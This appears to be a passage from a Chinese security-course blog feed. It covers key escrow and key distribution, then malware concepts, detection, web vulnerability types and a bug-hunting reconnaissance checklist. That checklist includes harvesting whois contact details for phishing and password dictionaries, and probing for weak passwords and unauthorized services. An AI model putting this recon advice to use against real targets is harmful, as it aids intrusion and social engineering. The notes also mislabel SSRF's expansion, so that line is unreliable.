<ul>
<li><p>密钥选项</p>
</li>
<li><p>密钥分割</p>
</li>
<li><p>密钥的产生和分配</p>
</li>
<li><p>密钥托管时间</p>
</li>
<li><p>密钥更新</p>
</li>
<li><p>密钥的全部和部分</p>
</li>
<li><p>密钥存储</p>
</li>
</ul>
<p>KEC在向DRC提供诸如托管的密钥等服务时，服务包括:<br>1 <span style = "color: blue;">授权过程</span>:对操作或使用DRC的用户进行身份认证和对访问 加密数据的授权证明。<br>2 传送数据恢复密钥(主密钥不提供):如果数据恢复密钥是 会话密钥或产品密钥，KEC向DRC直接传送数据恢复密钥。密 钥传送时和有效期一起传送，有效期过后，密钥将被自动销 毁。<br>3 传送派生密钥:KEC向DRC提供由数据恢复密钥导出的另一 密钥(派生密钥)。比如受时间限制的密钥，被加密的数据仅 能在一个特定的有效时间段内被解密。<br>4 解密密钥:如果在DRF中使用主密钥加密数据加密密钥 时，KEC只向DRC发送解密密钥，而不发送主密钥。<br>5 执行⻔限解密:每个托管机构向DRC提供自己的解密结 果，由DRC合成这些结果并得到明文。 6数据传输:KEC和DRC之间的数据传输可以是人工的也 可以是电子的。</p>
<p><strong>3.DRC</strong><br>(3)DRC:由算法、协议和设备组成。DRC利用KEC所提 供的和在DRF中包含的信息中<span style = "color: blue;">恢复出数据加密密钥</span>，进而解 密密文，得到明文。仅仅在执行指定的已授权的数据恢复时 使用。<br>为了解密数据，要获得数据加密密钥， DRC必须采用下列方 法来获得数据加密密钥:<br>(1)从发送方S或接收方R接入:<br>(2)与KEC交互<br>(3)穷举搜索</p>
<p>(1)<span style = "color: blue;">从发送方S或接收方R接入:</span></p>
<p>首先要确定与S或R相关的数据恢复密钥能否恢复密钥K。如果只 能利用S的托管机构持有的子密钥才能获得K，当各个用户分别向专 ⻔的用户传送消息，尤其是在多个用户散布在不同的国家或使用不 同的托管机构时，DRC一定得获取密钥托管数据后才能进行实时解 密，这是有困难的;同样，当只有利用R的托管机构所持的子密钥才 能获得K时，也不可能实时解密专⻔用户传送出的消息。如果利用托 管机构的子集所持的密钥可以进行数据恢复，那么一旦获得了K，则 DRC就可以实时解密从USC发出或送入的消息。该系统就可以为双 向实时通信提供这种能力，但这要求通信双方使用相同的K。</p>
<p>(2)<span style = "color: blue;">与KEC交互 </span></p>
<p>对于每个数据加密密钥，S或R都有可能要求DRC或KEC有一次相互作用，其中对数据加密密钥要求DRC与KEC之间的联系是 在线的，以支持当每次会话密钥改变时的实时解密。</p>
<p>(3)<span style = "color: blue;">穷举搜索 </span></p>
<p>当托管代理机构把部分密钥返回给DRC时，DRC必须使用穷举搜索以确定密钥的其余部分。<br>DRC还使用技术、操作和法律等保护手段来控制什么是可以解 密的，比如可以对数据恢复进行严格的时间限制。这些保护措施提 供了KEC传送密钥时所要求的限制，而且认证机构也可以防止DRC 用密钥产生伪消息。</p>
<h3 id="3-3-密钥分配方案"><a href="#3-3-密钥分配方案" class="headerlink" title="3.3 密钥分配方案"></a>3.3 密钥分配方案</h3><h4 id="3-3-1分配依据"><a href="#3-3-1分配依据" class="headerlink" title="3.3.1分配依据"></a>3.3.1分配依据</h4><ol>
<li><p>减轻负担，提高效率——（自动密钥分配机制）</p>
</li>
<li><p>提高安全性——减少系统中驻留的密钥量</p>
</li>
</ol>
<h4 id="3-3-2常用密钥分配技术"><a href="#3-3-2常用密钥分配技术" class="headerlink" title="3.3.2常用密钥分配技术"></a>3.3.2常用密钥分配技术</h4><ol>
<li><p>静态分配技术</p>
<p>静态分配技术是一种由中心以离线方式预分配的技术，是“面对面”的分发，如到银行领取信用卡密钥，它具有安全性 好的特点，是长期沿用的传统密钥管理技术，不过，它必须 解决密钥的存储技术，静态分发只能以集中式机制存在。</p>
</li>
<li><p>动态分配技术<br>动态分配技术是一种“请求一分发”的在线分发技术，如在网上申请用户密钥，它具有方便、及时的特点，但这种分配 技术需要有专门的协议的支持，动态分配技术可采用有中心 或无中心的机制。</p>
</li>
</ol>
<h4 id="3-3-3-密钥分配体制"><a href="#3-3-3-密钥分配体制" class="headerlink" title="3.3.3 密钥分配体制"></a>3.3.3 密钥分配体制</h4><p><strong>集中式密钥分配体制</strong><br>集中式分配体制是引入一个中心服务器（通常称作密钥分配中<br>心或KDC），在这个体系中，团体中的任何一个实体与中心服务 器共享一个密钥。在这样的系统中，需要存储的密钥数量和团体 的人数量差不多，KDC接受用户的请求，为用户提供安全的密钥 分配服务。它的典型代表是Kerboros协议。</p>
<p><strong>分布式密钥分配体制</strong><br>分布式分配体制中网络中的主机具有相同的地位，他们之间的 密钥分配取决于他们之间的协商，比较著名的有Diffie-Hellman密 钥交换协议，但Diffie-Hellman密钥交换协议没有提供鉴别机制，不能抵抗中间人攻击。</p>
<h4 id="3-3-4密钥分配的基本方法"><a href="#3-3-4密钥分配的基本方法" class="headerlink" title="3.3.4密钥分配的基本方法"></a>3.3.4密钥分配的基本方法</h4><p>对于通信双方A和B，密钥分配可以有以下几种方法：<br><strong>1</strong> 密钥由A选定，然后通过物理方法安全地传递给B。<br><strong>2</strong> 密钥由可信赖的第三方C选取并通过物理方法安全地发送给A 和B。<br><strong>3</strong> 如果A和B事先已有一密钥，那么其中一方选取新密钥后，用已有的密钥加密新密钥发送给另一方。<br><strong>4</strong> 如果A和B都有一个到可信赖的第三方C的保密信道，那么C就可以为A和B选取密钥后安全地发送给A和B。<br><strong>5</strong> 如果A和B都在可信赖的第三方C发布自己的公开密钥，那么 他们用彼此的公开密钥进行保密通信。</p>
<h4 id="3-3-5对称密码技术的密钥分配方案"><a href="#3-3-5对称密码技术的密钥分配方案" class="headerlink" title="3.3.5对称密码技术的密钥分配方案"></a>3.3.5对称密码技术的密钥分配方案</h4><p>ANSI X9.17定义了三层密钥层次结构：<br>1）主密钥（KKMs），通过手工分配；</p>
<p>2）密钥加密密钥（KKs），通过在线分配；</p>
<p>3）数据密钥（KDs）。</p>
<h5 id="对称密码技术的密钥分配方案："><a href="#对称密码技术的密钥分配方案：" class="headerlink" title="对称密码技术的密钥分配方案："></a>对称密码技术的密钥分配方案：</h5><p>（1）集中式密钥分配方案</p>
<p><img src="https://s2.loli.net/2024/11/03/8WwL9POfmzdjFDl.jpg" alt="10.jpg"></p>
<p>（2）分布式密钥分配方案</p>
<p>  分布式密钥分配方案是指网络通信中各个通信方具有相同的地位，它们之间的密钥分配取决于它们之间的协商，不受何其 他方的限制。这种密钥分配方案要求有n个通信方的网络需要 保存[n(n-1)&#x2F;2]个主密钥，对于较大型的网络，这种方案是不适用的，但是在<span style = "color: blue;">一个小型网络或一个大型网络的局部范围</span>内，这种方案还是有用的。</p>
<p><img src="https://s2.loli.net/2024/11/03/4TE9Yca6JqM8vNL.jpg" alt="11.jpg"></p>
<h4 id="3-3-6非对称密码技术的密钥分配方案"><a href="#3-3-6非对称密码技术的密钥分配方案" class="headerlink" title="3.3.6非对称密码技术的密钥分配方案"></a>3.3.6非对称密码技术的密钥分配方案</h4><h4 id="1-公钥的分配："><a href="#1-公钥的分配：" class="headerlink" title="(1)公钥的分配："></a><strong>(1)公钥的分配：</strong></h4><ol>
<li><p><strong>分开发布</strong></p>
<p> 公开发布:是指用户将自己的公钥发送给另外一个参与 者，或者把公钥广播给相关人群。</p>
<p>这种方法有一个非常大的缺 点:任何人都可以伪造一个公钥冒充他人。</p>
</li>
<li><p><strong>公用目录</strong><br> 由一个可信任的系统或组织建立和管理维护公用目录，该公用目录维持一个公开动态目录。公用目录为每个参与者维护一 个目录项{标识符，公钥}，每个目录项的信息必须进行安全认 证。<strong>任何人</strong>都可以从这里获得需要保密通信的公钥。与公开发布公钥相比，这种方法的安全性高一些。</p>
<p>但也有一个致命的弱点， 如果攻击者成功地得到目录管理机构的私钥，就可以伪造公钥， 并发送给给其他人达到欺骗的目的</p>
</li>
<li><p><strong>公钥机构</strong></p>
</li>
</ol>
<p>​	 为更严格控制公钥从目录分配出去的公钥更加安全，为此需 要引入一个公钥管理机构<strong>来为各个用户建立、维护和控制动态的公用目录</strong>。与单纯的公用目录相比，该方法的安全性更高。但这 种方式也有它的缺点:由于每个用户要想和其他人通信都需求助 于公钥管理机构，因而管理机构可能会成为系统的瓶颈，而且由 管理机构维护的公用目录也容易被攻击者攻击。</p>
<ol start="4">
<li><strong>公钥证书</strong></li>
</ol>
<p>  在不与公钥管理机构通信，又能证明其他通信方的公钥的可信度，实际上完全解决了公开发布及公用目录的安全问题。</p>
<p>采 用公钥证书是为了解决公开密钥管理机构的瓶颈问题。<br>公钥证书即数字证书是由授权中心CA(Certificate Authority)颁发的。</p>
<p><strong>证书的形式为CA&#x3D;ESKCA[T，IDA， PKA]，其中IDA是用户A的身份标识符，PKA是A的公钥，T是 当前时间戳，SKCA是CA的私钥。</strong></p>
<p>ps:公钥证书的发放过程：</p>
<p><img src="https://s2.loli.net/2024/11/05/cfoI9pu7gF6Cvhe.jpg" alt="12.jpg"></p>
<h4 id="2-利用非对称密码技术进行对称密码技术密钥的分配"><a href="#2-利用非对称密码技术进行对称密码技术密钥的分配" class="headerlink" title="(2)利用非对称密码技术进行对称密码技术密钥的分配:"></a>(2)利用非对称密码技术进行对称密码技术密钥的分配:</h4><ol>
<li><span style="color :blue;">简单分配:</span></li>
</ol>
<p>下图就是用 <strong>非对称密码技术建立会话密钥</strong> 的过程。</p>
<p><img src="https://s2.loli.net/2024/11/05/p32OPtFx451XISa.jpg" alt="13.jpg"></p>
<p>但这一分配方案容易 遭到主动攻击，假如攻击者已 经接入A和B双方的通信信 道，可以轻易地截获A、B双 方的通信。</p>
<ol start="2">
<li><p><span style="color :blue;">具有保密和认证功能的密钥分配:</span></p>
<p>针对简单分配密钥的缺点，人们又设计了<strong>具有保密和认证功能的非对称密码技术的密钥分配</strong>，如下图所示。</p>
<p><img src="https://s2.loli.net/2024/11/05/mxbtqU9RHKOZNVg.jpg" alt="14.jpg"></p>
<p>密钥分配过程既具有保密性，又具有认证性，因此既可以防止被动攻击，也可以防止主动攻击。</p>
</li>
</ol>
<h2 id="题："><a href="#题：" class="headerlink" title="题："></a>题：</h2><p>1.请分析网络信息安全非常重要的原因。</p>
<p>2.请说明网络信息安全的内涵、特征及网络信息安全问题的原因。</p>
<p>3.请说明网络信息安全的目标和功能是什么。</p>
<p>4.请说明信息安全技术需求和安全策略。</p>
<p>5.请说明信息安全与区块链安全的区别和联系。</p>
<p>6.请说明近几年国内出台了哪些网络相关法律，这些法律的出台有什么重要意义。</p>
<ol>
<li><p>比较对称密码算法和非对称密码算法的优缺点，考虑在异地的两个人如何通过不可信的网络信道传输信息？</p>
</li>
<li><p>两个交易者A和B，假设B没有A的电话或邮箱的前提下，B如何相信A在网上发布的公钥就是真真的A发布的公钥，而不是C假冒A发布的？</p>
</li>
<li><p>请说明密码学在信息安全领域有哪些作用。</p>
</li>
<li><p>请说明密码系统的组成及它们之间的关系。</p>
</li>
<li><p>请说明如何认识密码系统的安全性。</p>
</li>
<li><p>请说明密码分析者对密码技术的攻击方式有哪些，并简要说明？</p>
</li>
<li><p>给定DES算法，在平均意义下，有多少个密钥可以把一个指定的输入分组加密得到一个指定的输出分组？</p>
</li>
<li><p>什么是非对称加密？和对称加密的区别？它的工作原理是什么？</p>
</li>
<li><p>利用 ab mod n&#x3D;((a mod n)(b mod n)) mod n,能把35^77 mod<br>83所需的76次乘法运算化简到11次吗，还可以进一步化简吗。</p>
</li>
<li><p>选择两个素数p &#x3D; 7和 q &#x3D; 11。计算n 和 φ（n）；选择公钥指数e&#x3D;17。计算私钥指数d；加密明文消息m&#x3D;5，计算密文。</p>
</li>
<li><p>为什么要引进密钥管理技术？</p>
</li>
<li><p>密钥管理系统涉及到密钥管理的哪些方面？</p>
</li>
<li><p>什么是密钥托管？</p>
</li>
<li><p>简述分布式密钥分配方案的过程。</p>
</li>
<li><p>简述集中式密钥分配方案的过程，并分析可能存在的潜在威胁。</p>
</li>
</ol>
]]></content>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>区块链安全基础三</title>
    <url>/2024/11/26/%E9%93%BE%E5%AE%893/</url>
    <content><![CDATA[<h2 id="七-恶意代码及防范技术与漏洞挖掘技术"><a href="#七-恶意代码及防范技术与漏洞挖掘技术" class="headerlink" title="七.恶意代码及防范技术与漏洞挖掘技术"></a>七.恶意代码及防范技术与漏洞挖掘技术</h2><h3 id="7-1-恶意代码的概念"><a href="#7-1-恶意代码的概念" class="headerlink" title="7.1 恶意代码的概念"></a>7.1 恶意代码的概念</h3><h4 id="7-1-1常见名词举例"><a href="#7-1-1常见名词举例" class="headerlink" title="7.1.1常见名词举例"></a>7.1.1常见名词举例</h4><p><strong>计算机病毒</strong>：</p>
<p>是一种计算机程序代码，它递归地复制自己或其演化体。病毒感染宿主文件或者某个系统区域，或者仅仅是修改这些对象的引用，来获得控制权并不断地繁殖来产生新的病毒体</p>
<p><strong>蠕虫病毒</strong>：</p>
<p> 主要在网络上进行复制</p>
<p><strong>逻辑炸弹</strong>：</p>
<p> 通常是合法的应用程序，在编程时写入一些“恶意功能”</p>
<p><strong>特洛伊木马：</strong></p>
<p> 隐藏在一个合法的躯壳下的恶意代码</p>
<p><strong>漏洞利用</strong>：</p>
<p> 漏洞利用代码（exploit code）针对某一特定  漏洞或一组漏洞</p>
<p><strong>下载器</strong>：</p>
<p> 通过破坏杀毒软件，然后再从指定的地址下载大量其他病毒、木马进入用户电脑</p>
<p><strong>玩笑程序</strong></p>
<h4 id="7-1-2恶意代码的危害"><a href="#7-1-2恶意代码的危害" class="headerlink" title="7.1.2恶意代码的危害"></a>7.1.2恶意代码的危害</h4><ul>
<li>破坏数据</li>
<li>占用磁盘存储空间</li>
<li>抢占系统资源</li>
<li>影响计算机运行速度</li>
</ul>
<h4 id="7-1-3恶意代码的命名规则"><a href="#7-1-3恶意代码的命名规则" class="headerlink" title="7.1.3恶意代码的命名规则"></a>7.1.3恶意代码的命名规则</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;病毒前缀&gt;.&lt;病毒名&gt;.&lt;病毒后缀&gt; </span><br></pre></td></tr></table></figure>

<blockquote>
<p>病毒前缀是指一个病毒的种类</p>
</blockquote>
<blockquote>
<p>病毒名是指一个病毒的家族特征，是用来区别和标识病毒家族的</p>
</blockquote>
<blockquote>
<p>病毒后缀是指一个病毒的变种特征，是用来区别具体某个家族病毒的某个变种的</p>
</blockquote>
<h3 id="7-2-恶意代码的生存原理"><a href="#7-2-恶意代码的生存原理" class="headerlink" title="7.2 恶意代码的生存原理"></a>7.2 恶意代码的生存原理</h3><h4 id="7-2-1恶意代码的生命周期"><a href="#7-2-1恶意代码的生命周期" class="headerlink" title="7.2.1恶意代码的生命周期"></a>7.2.1恶意代码的生命周期</h4><p>•设计期：用编程语言制造一个恶意代码</p>
<p>•传播期：通过不同的途径散布和侵入受害系统中</p>
<p>•感染期：找到自己依附或隐藏的宿主，并实施依附或隐藏</p>
<p>•触发期：满足触发条件时，恶意代码进入运行期</p>
<p>•运行期：恶意代码的恶意目的得以展现</p>
<p>•消亡期：恶意代码被检测出来，并应用相应的手段进行处理</p>
<h4 id="7-2-2恶意代码的传播机制"><a href="#7-2-2恶意代码的传播机制" class="headerlink" title="7.2.2恶意代码的传播机制"></a>7.2.2恶意代码的传播机制</h4><ul>
<li><p>恶意代码传播主要是通过<strong>复制文件、传送文件、运行程序</strong>等方式进行。</p>
</li>
<li><p><strong>主要传播机制</strong>：</p>
</li>
</ul>
<p>​		 互联网</p>
<p>​		 局域网</p>
<p>​		 移动存储设备</p>
<p>​		 无线设备和点对点通信系统</p>
<h4 id="7-2-3恶意代码的感染机制"><a href="#7-2-3恶意代码的感染机制" class="headerlink" title="7.2.3恶意代码的感染机制"></a>7.2.3恶意代码的感染机制</h4><p><strong>感染执行文件</strong></p>
<p> <span style = "color: blue">主要感染.exe 和 .dll 等可执行文件和动态连接库文件</span></p>
<p> 根据恶意代码感染文件的方式不同，可以分为外壳型恶意代码、嵌入型恶意代码、源代码型恶意代码、覆盖型恶意代码和填充型恶意代码等</p>
<p><strong>感染引导区</strong></p>
<p> 如果恶意代码感染了引导区，开机后，它被读入内存时，杀毒软件还没有读入内存，恶意代码就获得了系统控制权，改写操作系统文件，隐藏自己</p>
<p><strong>感染结构化文档</strong></p>
<p> 宏病毒是一种寄存在文档或模板的宏中的恶意代码。一旦打开这样的文档，其中的宏就会被执行，于是宏病毒就会被激活，转移到计算机上，并驻留在Normal模板上。从此以后，所有自动保存的文档都会“感染”上这种宏病毒，而且如果其他用户打开了感染病毒的文档，宏病毒又会转移到他的计算机上</p>
<h4 id="7-2-4恶意代码的触发机制"><a href="#7-2-4恶意代码的触发机制" class="headerlink" title="7.2.4恶意代码的触发机制"></a>7.2.4恶意代码的触发机制</h4><ul>
<li><p>恶意代码在传染和发作之前，往往要判断某些特定条件是否满足，满足则传染或发作，否则不传染或不发作或只传染不发作</p>
</li>
<li><p>日期触发</p>
</li>
<li><p>时间触发</p>
</li>
<li><p>键盘触发</p>
</li>
<li><p>感染触发</p>
</li>
<li><p>启动触发</p>
</li>
<li><p>访问磁盘次数触发</p>
</li>
<li><p>调用中断功能触发</p>
</li>
<li><p>CPU型号&#x2F;主板型号触发</p>
<p>被恶意代码使用的触发条件是多种多样的，<strong>而且往往不只是使用上面所述的某一个条件，而是使用由多个条件组合起来的触发条件</strong></p>
</li>
</ul>
<h3 id="7-3-恶意代码的分析与检测技术"><a href="#7-3-恶意代码的分析与检测技术" class="headerlink" title="7.3 恶意代码的分析与检测技术"></a>7.3 恶意代码的分析与检测技术</h3><h4 id="7-3-1恶意代码的分析方法"><a href="#7-3-1恶意代码的分析方法" class="headerlink" title="7.3.1恶意代码的分析方法"></a>7.3.1恶意代码的分析方法</h4><p><strong>静态分析法</strong>:</p>
<p> 在不执行恶意代码的情况下进行分析。</p>
<p> 可以分为源代码分析、反汇编分析、二进制统计分析三种情况</p>
<p><strong>动态分析法</strong>:</p>
<p> 通过检测恶意代码执行的过程，分析执行过程中的操作。</p>
<p><strong>在实际应用中，一般将恶意代码分析方法分成三类：</strong></p>
<p>基于<strong>代码特征</strong>的分析方法</p>
<ul>
<li>首先，获取一个病毒程序的长度，根据长度可以将文件分为几份</li>
<li>然后，每份中选取通常为16或32个字节长的特征串</li>
<li>最后，将选取出来的几段特征码及它们的偏移量存入病毒库，标示出病毒的名称</li>
</ul>
<hr>
<p>基于<strong>代码语义</strong>的分析方法</p>
<ul>
<li>通过各种渠道收集到最新的未知恶意代码样本时，进行文件格式分析</li>
<li>对样本文件的属性进行查看分析</li>
<li>对样本的行为进行分析，分析它的本地感染行为，以及网络传播行为</li>
<li>通过静态反汇编工具（IDA等）对的恶意代码程序的PE文件进行反汇编</li>
<li>通过动态调试对恶意代码加载调试，进一步分析代码的操作</li>
</ul>
<hr>
<p>基于<strong>代码行为</strong>的分析方法</p>
<blockquote>
<p>基于以下理论展开：软件行为&#x3D; API + 参数</p>
</blockquote>
<p>about软件行为：</p>
<p><code>六大类常见软件恶意行为</code></p>
<ul>
<li>修改注册表启动项</li>
<li>修改关键文件</li>
<li>控制进程</li>
<li>访问网络资源</li>
<li>修改系统服务</li>
<li>控制窗口</li>
</ul>
<h4 id="7-3-2-恶意代码的检测方法"><a href="#7-3-2-恶意代码的检测方法" class="headerlink" title="7.3.2 恶意代码的检测方法"></a>7.3.2 恶意代码的检测方法</h4><ul>
<li><p>基于特征码的检测法</p>
</li>
<li><p>启发式检测法</p>
</li>
</ul>
<p>​	（通过对某种恶意代码调用内核函数的名称和次数进行分析，建立恶意代码内核函数调用集合，比较待查程序调用的内核函数和数据库中已知恶意代码的内核函数调用集合的贴近度）</p>
<ul>
<li><p>基于行为的检测法</p>
</li>
<li><p>完整性验证法</p>
</li>
<li><p>基于特征函数的检测方法（发现调用危险的特殊函数）</p>
</li>
</ul>
<h3 id="7-4-恶意代码的清除与预防技术"><a href="#7-4-恶意代码的清除与预防技术" class="headerlink" title="7.4 恶意代码的清除与预防技术"></a>7.4 恶意代码的清除与预防技术</h3><h4 id="7-4-1恶意代码的清除技术"><a href="#7-4-1恶意代码的清除技术" class="headerlink" title="7.4.1恶意代码的清除技术"></a>7.4.1恶意代码的清除技术</h4><ul>
<li>选择适当的封锁策略</li>
</ul>
<p>​		 鉴别和隔离被感染主机</p>
<p>​		 阻塞发送出的访问</p>
<p>​		 关闭邮件服务器</p>
<p>​		 断开局域网与因特网的连接</p>
<ul>
<li><p>感染来源线索的收集和处理</p>
</li>
<li><p>杀除与恢复</p>
</li>
</ul>
<h4 id="7-4-2恶意代码的预防技术"><a href="#7-4-2恶意代码的预防技术" class="headerlink" title="7.4.2恶意代码的预防技术"></a>7.4.2恶意代码的预防技术</h4><ul>
<li>使用反病毒软件</li>
<li>阻塞可疑文件</li>
<li>限制使用不必要的具有传输能力的文件</li>
<li>安全处理邮件附件</li>
<li>避免开放网络共享</li>
<li>使用Web浏览器的安全机制限制移动代码</li>
<li>设置邮件客户端</li>
</ul>
<h3 id="7-5-漏洞的基本概念"><a href="#7-5-漏洞的基本概念" class="headerlink" title="7.5 漏洞的基本概念"></a>7.5 漏洞的基本概念</h3><p><strong>漏洞</strong>（ Vulnerability），是指计算机系统安全方面的缺陷，使得系统或其应用数据的保密性、完整性、可用性、访问控制等面临威胁。</p>
<p><strong>许多安全漏洞是程序错误导致的，此时可叫做安全缺陷（</strong>Security bug），但并不是所有的安全隐患都是程序安全缺陷导致的。</p>
<p><strong>POC</strong> （Proof of concept）是对某些想法的一个较短而不完整的实现，以证明其可行性，示范其原理，其<strong>目的是为了验证一些概念或理论</strong>。概念验证通常被认为是一个有里程碑意义的实现的原型 。</p>
<p>在计算机安全术语中，<strong>概念验证经常被用来作为0day、exploit的别名</strong>。（通常指并没有充分利用这个漏洞的exploit）</p>
<p><strong>漏洞利用</strong> （Exploit，简称为EXP）是计算机安全术语，指的是利用程序中的某些漏洞，来得到计算机的控制权（使自己编写的代码越过具有漏洞的程序的限制，从而获得运行权限）。在英语中，表示为了利用漏洞而编写的攻击程序，即漏洞利用程序。</p>
<p><strong>零日漏洞</strong> （zero-day vulnerability、0-day vulnerability）通常是指还没有补丁的安全漏洞，而<strong>零日攻击</strong>（zero-day exploit、zero-day attack）则是指利用这种漏洞进行的攻击。提供该漏洞细节或者利用程序的人通常是该漏洞的发现者。</p>
<h3 id="7-6-漏洞挖掘技术的定义及分类"><a href="#7-6-漏洞挖掘技术的定义及分类" class="headerlink" title="7.6 漏洞挖掘技术的定义及分类"></a>7.6 漏洞挖掘技术的定义及分类</h3><p><strong>漏洞挖掘</strong> 是指查找目标系统中可能存在的漏洞，在这个过程中，需要运用多种计算机技术和工具。   </p>
<p>根据挖掘对象的不同，<strong>漏洞挖掘一般可以分为两大类</strong>，即<strong>基于源代码的漏洞挖掘</strong>和<strong>基于目标代码的漏洞挖掘。</strong></p>
<p>   对于基于源代码的漏洞挖掘来说，<strong>首先要获取</strong>系统或软件的<strong>源代码程序</strong>，采取<strong>静态分析</strong>或<strong>动态调试</strong>的方式<strong>查找</strong>其中可能存在的<strong>安全隐患</strong>。但大多数商业软件的源代码很难获得，一般只有一些开源系统能为挖掘者提供源码，如LINUX系统，所以目前基于源代码的挖掘一般都是LINUX系统及其开源软件。对于<strong>不能提供源码的系统或软件</strong>而言，只能<strong>采用基于目标代码的漏洞挖掘方法</strong>，该方法一般涉及程序编译器、计算机硬件指令系统、可执行文件格式等方面的分析技术，<strong>实现难度较大</strong>。</p>
<p><strong>WEB漏洞</strong> <strong>：</strong>通常是指网站程序上的漏洞，可能是由于代码编写者在编写代码时考虑不周全等原因而造成的漏洞，常见的WEB漏洞有<strong>Sql注入、Xss漏洞、上传漏洞</strong>等。</p>
<p><strong>XSS</strong> (Cross-Site Scripting)，跨站脚本，因为缩写和 CSS重叠，所以只能叫 XSS。跨站脚本是指通过存在安全漏洞的Web网站，在用户的<strong>浏览器内运行非法的HTML</strong>或<strong>JavaScript</strong>进行的一种攻击。</p>
<p><strong>SQL注入</strong> 就是指Web应用程序对<strong>用户输入数据的合法性没有判断</strong>，前端传入后端的参数是<strong>攻击者可控</strong>的，并且参数代入数据库查询，攻击者可以通过在不同的SQL语句来实现对数据库的任意操作。</p>
<p><strong>CSRF</strong>（Cross-Site Request Forgery）中文意思为跨站请求伪造，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。CSRF通过伪装成受信任用户请求受信任的网站。CSRF难以防范，危险性比XSS更高。</p>
<p><strong>SSRF</strong>（Cross-Site Request Forgery）中文为服务器端请求伪造，是一种由攻击者构造请求，由服务端发起请求的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统。</p>
<p><strong>文件上传漏洞</strong> 是在上传文件时，如果服务器代码未对客户端上传的文件进行严格的验证和过滤，很容易造成可以上传任意文件的情况，包括上传脚本文件（asp、aspx、php、jsp等格式的文件）。非法用户可以利用上传的恶意脚本文件控制整个网站，甚至控制服务器。这个恶意的脚本文件，又被成为WebShell，也可将WebShell脚本称为一种网页后门，WebShell脚本具有非常强大的功能，比如查看服务器目录、服务器中的文件，执行系统命令等。</p>
<p><strong>命令执行</strong> 应用程序有时需要调用一些执行系统命令的函数，如在PHP中，使用system、exec、shell_exec、passthru、popen、proc_popen等函数可以执行系统命令。当黑客能控制这些函数中的参数时，就可以将恶意的系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。</p>
<p><strong>逻辑漏洞</strong> 就是指攻击者利用业务的设计缺陷，获取敏感信息或破坏业务的完整性。一般出现在密码修改、越权访问、密码找回、交易支付金额等功能处。其中越权访问又分为水平越权和垂直越权。</p>
<h3 id="7-7-漏洞挖掘技术的一般流程"><a href="#7-7-漏洞挖掘技术的一般流程" class="headerlink" title="7.7 漏洞挖掘技术的一般流程"></a>7.7 漏洞挖掘技术的一般流程</h3><p><strong>阅读规则确定测试范围</strong></p>
<p><strong>信息搜集-子域名收集</strong></p>
<p><strong>工具：DNS枚举：一台服务器、一个工具</strong></p>
<p>​			DNSenum是一款非常强大的域名信息收集工具。它能够通过谷歌或者字典文件猜测可能存在的域名，并对一个网段进行反向查询。它不仅可以查询网站的主机地址信息、域名服务器、邮件交换记录，还可以在域名服务器上执行axfr请求，然后通过谷歌脚本得到扩展域名信息，提取出域名并查询，最后计算C类地址并执行whois查询，执行反向查询，把地址段写入文件。</p>
<p>在Kali Linux安全渗透教程新手版中讲解过该工具的基本使用。这里讲解一下该工具的字典破解子域名功能。</p>
<p>首先使用-f选项指定一个常见子域名字典文件；然后使用-u选项，设置字典文件更新方式。当设置a，则将本次执行过程中，从其他图形获取的子域名添加到该文件中。这样，就相当于维护了字典文件。</p>
<p>​				坑： 1.泛解析 2.不够全面 </p>
<p><strong>子域名收集–泛解析问题</strong></p>
<p><strong>信息搜集-C段资产收集</strong></p>
<p><strong>信息搜集–移动端资产收集</strong></p>
<p><strong>信息搜集–同备案号资产收集</strong></p>
<h3 id="7-8-漏洞挖掘技术的常用方法和工具"><a href="#7-8-漏洞挖掘技术的常用方法和工具" class="headerlink" title="7.8 漏洞挖掘技术的常用方法和工具"></a>7.8 漏洞挖掘技术的常用方法和工具</h3><p><strong>黑盒测试指</strong>把被测试目标看做一个黑盒子，<strong>对于内部结构、运作情况是不可见的</strong>。模拟黑客的攻击行为，找出目标点存在的漏洞</p>
<p>  在黑盒漏洞挖掘中，必须要做的事就是对目标资产的收集，收集的资产越多，越容易挖出漏洞</p>
<p><strong>白盒审计</strong>是已知源代码，根据源代码审计漏洞</p>
<p><strong>审计方法简介</strong></p>
<p>1.定位敏感关键字，回溯参数传递过程</p>
<p>2.定位敏感功能点，通读功能点代码(系统重装、文件上传、文件功能管理、登录认证、密码找回、订单支付)</p>
<p>3.通读全文</p>
<p>方法1 优势在于能快速审计，代码量小，容易找到漏洞点，但是也容易忽略很多漏洞，如逻辑漏洞无法这样审计得到</p>
<p>方法2 优势在于代码量比通读全文小，能审计出逻辑漏洞</p>
<p>方法3 不会出现忽略漏洞的情况，但是代码量大，耗费时间长</p>
<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a><strong>信息收集</strong></h4><p>（列出信息收集需要收集的点）</p>
<p>1.<strong>查询网站whois信息</strong>，从whois和网站中获取注册者的电话、姓名、邮箱等信息方便后期社工钓鱼生成专属密码字典等<br> 2.<strong>shadon、fofa等网络资产搜索引擎</strong>，天眼查网站的相关产权获得一些资产、github敏感信息泄露、各种网盘搜索引擎、微信公众号、服务号、小程序、app等<br> 3.<strong>查看网站旁站和子域名</strong>(主站一般防护都挺严)，网站都查询一下网站指纹是否存在通用CMS漏洞<br> 4.<strong>查看服务器操作系统版本，Web中间件，网站语言等等</strong>，看看有没有可以利用的Web中间件漏洞<br> 5.<strong>网站目录扫描</strong>，看看有没有敏感信息和接口泄露，如网站管理后台、网站源码备份、git泄露、phpinfo等<br> 6.<strong>用JSFinder从网站JS里面提取信息</strong>，看有没有敏感接口和链接，顺便在收集一下子域名看有没有之前漏掉的<br> 7.<strong>使用全球ping查看网站</strong>是否存在cdn（CDN是指内容分发网络）<br> 8.<strong>端口扫描</strong>，查看有无可利用端口，如ftp、ssh的弱口令，rsync、Redis、docker等的未授权访问等</p>
<p>（rsync是linux系统下的数据镜像备份工具）</p>
<h4 id="关于扫描"><a href="#关于扫描" class="headerlink" title="关于扫描"></a>关于扫描</h4><p><strong>whois</strong></p>
<p>它能查询到域名注册者的信息</p>
<p><strong>Dirbuster&amp;御剑</strong></p>
<p>这两款工具都是网站目录扫描工具，可以扫描敏感信息及接口</p>
<p><strong>Google hacking</strong></p>
<p>可以用来指定搜索语法搜索自己想要的内容，如网站后台搜索，子域名搜集，具体事物的信息收集</p>
<p><strong>whatweb</strong></p>
